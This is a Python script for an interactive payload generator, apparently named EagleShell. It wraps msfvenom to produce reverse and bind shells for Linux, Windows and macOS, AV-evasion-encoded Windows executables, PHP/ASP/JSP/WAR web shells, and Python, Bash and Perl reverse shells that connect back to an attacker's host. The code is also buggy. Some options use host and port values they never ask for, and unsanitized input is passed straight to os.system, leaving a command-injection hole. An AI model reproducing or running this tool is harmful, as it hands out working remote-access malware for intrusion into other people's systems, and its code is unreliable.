#!/usr/bin/python3

from assets.banners import pgen_banner
from assets.designs import *
from assets.properties import clear_screen

import os

def pgen_main():
    global lhost_set
    global rhost_set
    global lport_set
    global output
    global name
    lhost_set = ''
    rhost_set = ''
    lport_set = ''
    output = ''
    name = ''

    def payloads():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\t1): Binaries Payloads')
            print('\t2): Web Payloads')
            print('\t3): Scripting Payloads')
            print('\t4): Exit')
            print('')
            while True:
                linux_shells_select = input('\u001b[33mSHELL \u001b[37m> ').lower()
                if linux_shells_select == '1':
                    os_binaries_payloads()
                elif linux_shells_select == '2':
                    web_payloads()
                elif linux_shells_select == '3':
                    scripting_payloads()
                elif linux_shells_select == '4':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def os_binaries_payloads():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('OS:')
            print('')
            print('\t1): Linux')
            print('\t2): Windows')
            print('\t3): Mac')
            print('\t4): Exit')
            print('')
            while True:
                binaries_payloads_os_select = input('\u001b[33mOS \u001b[37m> ').lower()
                if binaries_payloads_os_select == '1':
                    linux_binaries_payloads()
                elif binaries_payloads_os_select == '2':
                    windows_binaries_payloads()
                elif binaries_payloads_os_select == '3':
                    mac_binaries_payloads()
                elif binaries_payloads_os_select == '4':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def linux_binaries_payloads():
        try:
            global payload
            global output
            global lhost_set
            global rhost_set
            global lport_set
            global cmd
            global name
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Linux Meterpreter Reverse Shell')
            print('\t2): Linux Bind Meterpreter Shell')
            print('\t3): Linux Bind Shell')
            print('\t4): Exit')
            print('')
            while True:
                linux_payloads_binaries_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if linux_payloads_binaries_select == '1':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Linux Meterpreter Reverse Shell'
                    cmd = 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f elf -o ' + output + '/' + name + '.elf'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif linux_payloads_binaries_select == '2':
                    rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Linux Bind Meterpreter Shell'
                    cmd = 'msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=' + rhost_set + ' LPORT=' + lport_set + ' -f elf -o ' + output + '/' + name + '.elf'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif linux_payloads_binaries_select == '3':
                    rhost_set = input('\u001b[33mRHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Linux Bind Shell'
                    cmd = 'msfvenom -p generic/shell_bind_tcp RHOST=' + rhost_set + ' LPORT=' + lport_set + ' -f elf -o ' + output + '/' + name + '.elf'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif linux_payloads_binaries_select == '4':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def windows_binaries_payloads():
        try:
            global payload
            global output
            global lhost_set
            global rhost_set
            global lport_set
            global cmd
            global name
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Windows Meterpreter Reverse TCP Shell')
            print('\t2): Windows Reverse TCP Shell')
            print('\t3): Windows Encoded Meterpreter Windows Reverse Shell')
            print('\t4): Exit')
            print('')
            while True:
                windows_payloads_binaries_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if windows_payloads_binaries_select == '1':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Windows Meterpreter Reverse TCP Shell'
                    cmd = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f exe -o ' + output + '/' + name + '.exe'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif windows_payloads_binaries_select == '2':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Windows Reverse TCP Shell'
                    cmd = 'msfvenom -p windows/shell/reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f exe -o ' + output + '/' + name + '.exe'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif windows_payloads_binaries_select == '3':
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Windows Encoded Meterpreter Windows Reverse Shell'
                    cmd = 'msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe -o ' + output + '/' + name + '.exe'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif windows_payloads_binaries_select == '4':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def mac_binaries_payloads():
        try:
            global payload
            global output
            global lhost_set
            global rhost_set
            global lport_set
            global cmd
            global name
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\tBinaries Payloads')
            print('\t----------------------------')
            print('\t1): Mac Reverse Shell')
            print('\t2): Mac Bind Shell')
            print('\t3): Exit')
            print('')
            while True:
                mac_payloads_binaries_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if mac_payloads_binaries_select == '1':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Mac Reverse Shell'
                    cmd = 'msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f macho -o ' + output + '/' + name + '.macho'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif mac_payloads_binaries_select == '2':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Mac Bind Shell'
                    cmd = 'msfvenom -p osx/x86/shell_bind_tcp RHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f macho -o ' + output + '/' + name + '.macho'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif mac_payloads_binaries_select == '3':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def web_payloads():
        try:
            global payload
            global output
            global lhost_set
            global rhost_set
            global lport_set
            global cmd
            global name
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\tWeb Payloads')
            print('\t----------------------------')
            print('\t1): PHP Meterpreter Reverse TCP')
            print('\t2): ASP Meterpreter Reverse TCP')
            print('\t3): JSP Java Meterpreter Reverse TCP')
            print('\t4): WAR')
            print('\t5): Exit')
            print('')
            while True:
                web_payloads_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if web_payloads_select == '1':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'PHP Meterpreter Reverse TCP'
                    cmd = 'msfvenom -p php/meterpreter_reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f raw -o ' + output + '/' + name + '.php'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif web_payloads_select == '2':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'ASP Meterpreter Reverse TCP'
                    cmd = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f asp -o ' + output + '/' + name + '.asp'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif web_payloads_select == '3':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'JSP Java Meterpreter Reverse TCP'
                    cmd = 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f raw -o ' + output + '/' + name + '.jsp'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif web_payloads_select == '4':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'WAR'
                    cmd = 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f war -o ' + output + '/' + name + '.war'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif web_payloads_select == '5':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def scripting_payloads():
        try:
            global payload
            global output
            global lhost_set
            global rhost_set
            global lport_set
            global cmd
            global name
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Payloads:')
            print('')
            print('\tScripting Payloads')
            print('\t----------------------------')
            print('\t1): Python Reverse Shell')
            print('\t2): Bash Unix Reverse Shell')
            print('\t3): Perl Unix Reverse shell')
            print('\t4): Exit')
            print('')
            while True:
                scripting_payloads_select = input('\u001b[33mPAYLOAD \u001b[37m> ').lower()
                if scripting_payloads_select == '1':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Python Reverse Shell'
                    cmd = 'msfvenom -p cmd/unix/reverse_python LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f raw -o ' + output + '/' + name + '.py'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif scripting_payloads_select == '2':
                    lhost_set = input('\u001b[33mLHOST \u001b[37m> ').lower()
                    lport_set = input('\u001b[33mLPORT \u001b[37m> ').lower()
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Bash Unix Reverse Shell'
                    cmd = 'msfvenom -p cmd/unix/reverse_bash LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f raw -o ' + output + '/' + name + '.sh'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif scripting_payloads_select == '3':
                    print('Example: /tmp')
                    output = input('\u001b[33mOUTPUT \u001b[37m> ')
                    name = input('\u001b[33mNAME \u001b[37m> ')
                    print('\u001b[32;1m[+] Generating Payload. Please Wait...')
                    payload = 'Perl Unix Reverse shell'
                    cmd = 'msfvenom -p cmd/unix/reverse_perl LHOST=' + lhost_set + ' LPORT=' + lport_set + ' -f raw -o ' + output + '/' + name + '.pl'
                    os.system(cmd + '>/dev/null 2>&1')
                    result()
                elif scripting_payloads_select == '4':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def result():
        try:
            os.system(clear_screen)
            print(logo)
            print('')
            print(line)
            print(pgen_banner)
            print(line)
            print('')
            print(author)
            print('Output:')
            print('')
            print('\tPAYLOAD: ' + payload)
            if len(lhost_set) >= 1:
                print('\tLHOST: ' + lhost_set)
            elif len(rhost_set) >= 1:
                print('\tRHOST: ' + rhost_set)
            else:
                pass
            if len(lport_set) >= 1:
                print('\tLPORT: ' + lport_set)
            else:
                pass
            print('')
            print('\tOUTPUT: ' + output + '/' + name)
            print('')
            print('\t1): New')
            print('\t2): Exit')
            print('')
            while True:
                eagleshell_cmd = input('\u001b[33mEagleShell \u001b[37m> ').lower()
                if eagleshell_cmd == '1':
                    pgen_main()
                elif eagleshell_cmd == '2':
                    exit_shell()
                else:
                    print('\u001b[31m[-] Invalid Input.')
                    continue
        except KeyboardInterrupt:
            exit_shell()

    def exit_shell():
        print('\n\u001b[31m[-] Exiting EagleShell')
        print('\u001b[0m')
        os.system(clear_screen)
        exit()

    payloads()


pgen_main()
